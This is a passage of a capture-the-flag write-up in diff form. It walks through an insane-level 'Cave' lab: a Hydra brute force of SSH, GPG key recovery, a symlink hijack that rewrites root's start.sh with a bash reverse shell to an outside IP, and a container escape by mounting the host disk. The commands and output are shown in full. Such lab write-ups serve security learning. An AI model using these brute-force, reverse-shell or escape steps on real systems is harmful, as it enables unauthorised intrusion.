@@ -454,3 +454,326 @@ On the door it is carved the following statement:
 
 cave@cave:~$ 
 ```
+
+---
+
+## Lateral Movement:
+
+> We had the regex which door's password is made of. I used regex to generate a password list.
+
+```shell
+┌──(venv)─(root㉿kali)-[~/venv]
+└─# exrex -o passwords '^ed[h#f]{3}[123]{1,2}xf[@#\*\!]$'
+                                                                                                                                                                   
+┌──(venv)─(root㉿kali)-[~/venv]
+└─# head -10 passwords                                                    
+edhhh1xf@
+edhhh1xf#
+edhhh1xf*
+edhhh1xf!
+edhhh2xf@
+edhhh2xf#
+edhhh2xf*
+edhhh2xf!
+edhhh3xf@
+edhhh3xf#                                                                                                                                                       
+┌──(venv)─(root㉿kali)-[~/venv]
+└─# 
+```
+
+> Hydra brute forcing on port 2222
+
+```shell
+┌──(venv)─(root㉿kali)-[~/venv]
+└─# hydra -l door -P passwords ssh://cave.thm -s 2222
+Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-07-12 17:46:45
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 1296 login tries (l:1/p:1296), ~81 tries per task
+[DATA] attacking ssh://cave.thm:2222/
+[STATUS] 256.00 tries/min, 256 tries in 00:01h, 1041 to do in 00:05h, 15 active
+[STATUS] 248.67 tries/min, 746 tries in 00:03h, 552 to do in 00:03h, 14 active
+[2222][ssh] host: cave.thm   login: door   password: edfh#22xf!
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-07-12 17:50:42
+```
+
+> Okay, we got a hit with `door:edfh#22xf!`. Let's connect via ssh:
+
+```shell
+┌──(venv)─(root㉿kali)-[~/venv]
+└─# ssh door@cave.thm -p 2222
+The authenticity of host '[cave.thm]:2222 ([10.130.130.129]:2222)' can't be established.
+ED25519 key fingerprint is: SHA256:Hnwg+a7PSFNlwmGGwj3zq5cewCxz/3v1bB1SaeMwY3U
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[cave.thm]:2222' (ED25519) to the list of known hosts.
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+door@cave.thm's password: 
+Welcome to Ubuntu 20.04 LTS (GNU/Linux 4.15.0-112-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+door@cave:~$ ls
+info.txt  oldman.gpg  skeleton
+door@cave:~$ cat info.txt
+After using your brute force against the door you broke it!
+You can see that the cave has only one way, in your right you see an old man speaking in charades and in front of you there's a fully armed skeleton.
+It looks like the skeleton doesn't want to let anyone pass through.
+door@cave:~$ 
+```
+
+> I saw that there was an environment variable called `INVENTORY`, and obviously, we need to export an item to defeat the skeleton. After a hint, I discovered the `adventurer` folder inside `/var/www` which belonged to `root` user and `www-data` group, hinting a potential subdomain. I added it to my `/etc/hosts`, and found the `adventurer.priv` file with a private GPG KEY inside. We can decrypt what the oldman says.
+
+```shell
+door@cave:~$ cat -v info.txt 
+After using your brute force against the door you broke it!
+You can see that the cave has only one way, in your right you see an old man speaking in charades and in front of you there's a fully armed skeleton.
+The private key password is breakingbonessince1982 ^[[A
+It looks like the skeleton doesn't want to let anyone pass through.
+door@cave:~$ gpg --import private.key
+gpg: key FFF6C0EECD850FDC: "adventurer <adventurer@cave.com>" not changed
+gpg: key FFF6C0EECD850FDC: secret key imported
+gpg: Total number processed: 1
+gpg:              unchanged: 1
+gpg:       secret keys read: 1
+gpg:   secret keys imported: 1
+door@cave:~$ gpg --decrypt oldman.gpg
+gpg: Note: secret key D5A213D292A0A259 expired at Fri Aug 26 20:07:51 2022 -03
+gpg: encrypted with 3072-bit RSA key, ID D5A213D292A0A259, created 2020-08-26
+      "adventurer <adventurer@cave.com>"
+IT'S DANGEROUS TO GO ALONE! TAKE THIS bone-breaking-war-hammer
+door@cave:~$ 
+
+```
+
+> First, I imported the private gpg key as private.key, but it asked for a passphrase. I did not know it, but looks like it was inside `info.txt` all along. It was just hidden with the help of `^[[A`. Then I defeated the skeleton with the hammer. After this, I will read every .txt file with `cat -v` xD
+
+```shell
+door@cave:~$ export INVENTORY=bone-breaking-war-hammer
+door@cave:~$ ./skeleton
+skeleton:sp00kyscaryskeleton
+door@cave:~$ 
+```
+
+## Skeleton
+
+> I authenticated as `Skeleton`, and when I saw the word root, I instantly thought maybe we had to finally privEsc instead of moving laterally, and used `sudo -l` to list the current user's privileges. `/bin/kill`? Well, that's new. There was nothing in GTFObins so I had to come up with something myself.
+
+
+```shell
+┌──(root㉿kali)-[~/venv]
+└─# ssh skeleton@cave.thm -p 2222
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+skeleton@cave.thm's password: 
+Welcome to Ubuntu 20.04 LTS (GNU/Linux 4.15.0-112-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+skeleton@cave:~$ ls
+info.txt
+skeleton@cave:~$ cat -v info.txt
+After successfully defeating the skeleton with the bone-breaking-war-hammer you went forward.
+In front of you there's a big opening and after it there's a huge tree that seems magical, you can feel the freedom!
+But although you can see it, you can't go to it because there's an invisible wall that keeps you from getting to the root of the tree.
+skeleton@cave:~$ sudo -l
+Matching Defaults entries for skeleton on localhost:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User skeleton may run the following commands on localhost:
+    (root) NOPASSWD: /bin/kill
+```
+
+> Let's check the sudo version, because there was nothing I could do with kill binary, considering how dry was that `ps aux` results. However, inside /opt:
+
+```shell
+skeleton@cave:/opt/link$ find / -perm -o+w -type d 2>/dev/null
+/dev/shm
+/dev/mqueue
+/run/lock
+/tmp
+/var/tmp
+/var/lib/php/sessions
+/opt/link
+
+skeleton@cave:/$ cd /opt
+skeleton@cave:/opt$ ls
+link
+skeleton@cave:/opt$ cd link
+skeleton@cave:/opt/link$ ls
+startcon
+skeleton@cave:/opt/link$ ls -la startcon 
+lrwxrwxrwx 1 skeleton skeleton 16 Aug 27  2020 startcon -> ../root/start.sh
+skeleton@cave:/opt/link$ 
+```
+
+> Then I removed the startcon and created my own symlink since this folder is world writable, and owned by root. Since there was no root directory under /opt, we had to fix it by making it an absolute path. Looks like we can manipulate the root owned start.sh file. Let's put our malicious commands inside it.
+
+```shell
+skeleton@cave:/opt/link$ ls -la
+total 8
+drwxrwxrwx 2 root     root     4096 Aug 28  2020 .
+drwxr-xr-x 1 root     root     4096 Aug 27  2020 ..
+lrwxrwxrwx 1 skeleton skeleton   16 Aug 27  2020 startcon -> ../root/start.sh
+skeleton@cave:/opt/link$ cat startcon
+cat: startcon: No such file or directory
+skeleton@cave:/opt/link$ rm startcon
+skeleton@cave:/opt/link$ ln -s /root/start.sh privesc
+skeleton@cave:/opt/link$ cat privesc 
+#!/bin/bash
+
+service ssh start
+service apache2 start
+su - cave -c "cd /home/cave/src; ./run.sh"
+
+/bin/bash
+skeleton@cave:/opt/link$ 
+
+```
+
+> Looks like we are inside of a docker container.
+
+```shell
+skeleton@cave:/opt/link$ nano privesc
+skeleton@cave:/opt/link$ cat privesc
+#!/bin/bash
+
+bash -i >& /dev/tcp/192.168.152.35/1234 0>&1
+skeleton@cave:/opt/link$ ps au
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root         1  0.0  0.1   3980  2840 pts/0    Ss+  20:02   0:00 /bin/bash /root/start.sh
+root        63  0.0  0.1   5272  3228 pts/0    S+   20:02   0:00 su - cave -c cd /home/cave/src; ./run.sh
+skeleton   103  0.0  0.1   5996  3860 pts/1    Ss   20:03   0:00 -bash
+skeleton   117  0.0  0.1   7636  3284 pts/1    R+   20:07   0:00 ps au
+skeleton@cave:/opt/link$ ls -la /.dockerenv       ls -la /.dockerenv
+ls -la /.dockerenv
+-rwxr-xr-x 1 root root 0 Aug 27  2020 /.dockerenv
+skeleton@cave:/opt/link$ cat /proc/1/cgroup
+12:freezer:/docker/6c1115081ba4f0c04a9d2c8e883e327e7c07a9ce193732a9c331d68fca68a02b
+11:rdma:/
+10:pids:/docker/6c1115081ba4f0c04a9d2c8e883e327e7c07a9ce193732a9c331d68fca68a02b
+9:cpu,cpuacct:/docker/6c1115081ba4f0c04a9d2c8e883e327e7c07a9ce193732a9c331d68fca68a02b
+8:perf_event:/docker/6c1115081ba4f0c04a9d2c8e883e327e7c07a9ce193732a9c331d68fca68a02b
+7:blkio:/docker/6c1115081ba4f0c04a9d2c8e883e327e7c07a9ce193732a9c331d68fca68a02b
+6:hugetlb:/docker/6c1115081ba4f0c04a9d2c8e883e327e7c07a9ce193732a9c331d68fca68a02b
+5:memory:/docker/6c1115081ba4f0c04a9d2c8e883e327e7c07a9ce193732a9c331d68fca68a02b
+4:cpuset:/docker/6c1115081ba4f0c04a9d2c8e883e327e7c07a9ce193732a9c331d68fca68a02b
+3:devices:/docker/6c1115081ba4f0c04a9d2c8e883e327e7c07a9ce193732a9c331d68fca68a02b
+2:net_cls,net_prio:/docker/6c1115081ba4f0c04a9d2c8e883e327e7c07a9ce193732a9c331d68fca68a02b
+1:name=systemd:/docker/6c1115081ba4f0c04a9d2c8e883e327e7c07a9ce193732a9c331d68fca68a02b
+0::/system.slice/snap.docker.dockerd.service
+```
+
+> Let's kill the process with pid 1, so it restarts, and script runs again on boot. I tried killing all processes using `sudo /bin/kill -9 -1, and even with -15, but it all gave segmentation fault. And killing the pid 1 process did not work, so I killed all one by one until container stopped.
+
+> Tab 1
+
+```shell
+skeleton@cave:/opt/link$ ps aux
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root         1  0.0  0.1   3980  2840 pts/0    Ss+  20:02   0:00 /bin/bash /root/start.sh
+root        21  0.0  0.2  12164  4320 ?        Ss   20:02   0:00 sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups
+root        48  0.0  0.9 195800 19092 ?        Ss   20:02   0:00 /usr/sbin/apache2 -k start
+www-data    56  0.0  0.4 196056  8628 ?        S    20:02   0:00 /usr/sbin/apache2 -k start
+www-data    57  0.0  0.4 196056  8628 ?        S    20:02   0:00 /usr/sbin/apache2 -k start
+www-data    58  0.0  0.4 196056  8628 ?        S    20:02   0:00 /usr/sbin/apache2 -k start
+www-data    59  0.0  0.4 196056  8628 ?        S    20:02   0:00 /usr/sbin/apache2 -k start
+www-data    60  0.0  0.4 196056  8628 ?        S    20:02   0:00 /usr/sbin/apache2 -k start
+root        63  0.0  0.1   5272  3228 pts/0    S+   20:02   0:00 su - cave -c cd /home/cave/src; ./run.sh
+cave        64  0.0  0.1   3980  2972 ?        Ss   20:02   0:00 -bash -c cd /home/cave/src; ./run.sh
+cave        66  0.0  0.1   3900  2764 ?        S    20:02   0:00 /bin/bash ./run.sh
+cave        77  0.0  1.1 2375684 23308 ?       Sl   20:02   0:00 java -cp .:commons-io-2.7.jar RPG
+root        87  0.0  0.4  13608  8852 ?        Ss   20:02   0:00 sshd: skeleton [priv]
+skeleton   102  0.0  0.2  13884  5276 ?        S    20:03   0:00 sshd: skeleton@pts/1
+skeleton   103  0.0  0.1   5996  3868 pts/1    Ss   20:03   0:00 -bash
+skeleton   209  0.0  0.1   7636  3212 pts/1    R+   20:17   0:00 ps aux
+skeleton@cave:/opt/link$ sudo /bin/kill -9 1 21 48 56 57 58 59 60 63 64 66 77 87 102 103 209
+Connection to cave.thm closed by remote host.
+Connection to cave.thm closed.                          
+```
+
+> Tab 2
+
+```shell
+┌──(root㉿kali)-[~/venv]
+└─# rlwrap nc -lvnp 1234
+listening on [any] 1234 ...
+connect to [192.168.152.35] from (UNKNOWN) [10.129.141.50] 32960
+root@cave:/#
+root@cave:/# cd /root     cd /root
+cd /root
+root@cave:~# ls           ls
+ls
+info.txt
+start.sh
+root@cave:~# cat info.txt cat info.txt
+cat info.txt
+You were analyzing the invisible wall and after some time, you could see your reflection in the corner of the wall.
+But it wasn't just like a mirror, your reflection could interact with the real world, there was a link between you two!
+And then you used your reflection to grab a little piece of the root of the tree and you stuck it in the wall with all your might.
+You could feel the cave rumbling, like it was the end for you and then all went black.
+But after some time, you woke up in the same place you were before, but now there was no invisible wall to stop you from getting in the root.
+
+You are in the root of a huge tree, but your quest isn't over, you still feel ... contained, inside this cave.
+
+Flag:THM{no_wall_can_stop_me}
+root@cave:~# 
+```
+> Looks like we are inside of another docker container, which is implied by `you still feel ... contained`.
+
+```shell
+root@cave:~# lsblk        
+NAME    MAJ:MIN RM   SIZE RO TYPE MOUNTPOINT
+loop0     7:0    0 125.9M  1 loop 
+loop1     7:1    0  89.1M  1 loop 
+loop2     7:2    0  96.6M  1 loop 
+xvda    202:0    0    10G  0 disk 
+|-xvda1 202:1    0     1M  0 part 
+`-xvda2 202:2    0    10G  0 part /etc/hosts
+xvdh    202:112  0     1G  0 disk 
+root@cave:~# mkdir /mnt/homkdir /mnt/host
+root@cave:~# mount /dev/xvmount /dev/xvda2 /mnt/host
+root@cave:~# cd /mnt       
+cd /mnt
+root@cave:/mnt# ls              
+ls
+host
+root@cave:/mnt# cd host        
+cd host
+root@cave:/mnt/host# cd root      
+root@cave:/mnt/host/root# ls        
+info.txt
+snap
+root@cave:/mnt/host/root# cat info.txt    
+You were looking at the tree and it was clearly magical, but you could see that the farther you went from the root, the weaker the magical energy.
+So the energy was clearly coming from the bottom, so you saw that the soil was soft, different from the rest of the cave, so you dug down.
+After digging for some time, you realized that the root stopped getting thinner, in fact it was getting thicker and thicker.
+Suddently the gravity started changing and you grabbed the nearest thing you could get a hold of, now what was up was down.
+And when you looked up you saw the same tree, but now you can see the sun, you're finally in the outside.
+
+Flag:THM{digging_down_then_digging_up}
+root@cave:/mnt/host/root#
+```
+
+---
+
+> Well, it was easily one of the hardest CTFs I've ever done. I had to get some hints and help while doing this, to be honest, but it was worth it. It was my first `Insane` level lab, and I actually did learn new things. Besides all these, I am in love with the concept of this room. It reminded me of that one Black Mirror interactive movie "Bandersnatch" and "Choose or Die" Movie. I recommend you watch both! GOATED!!
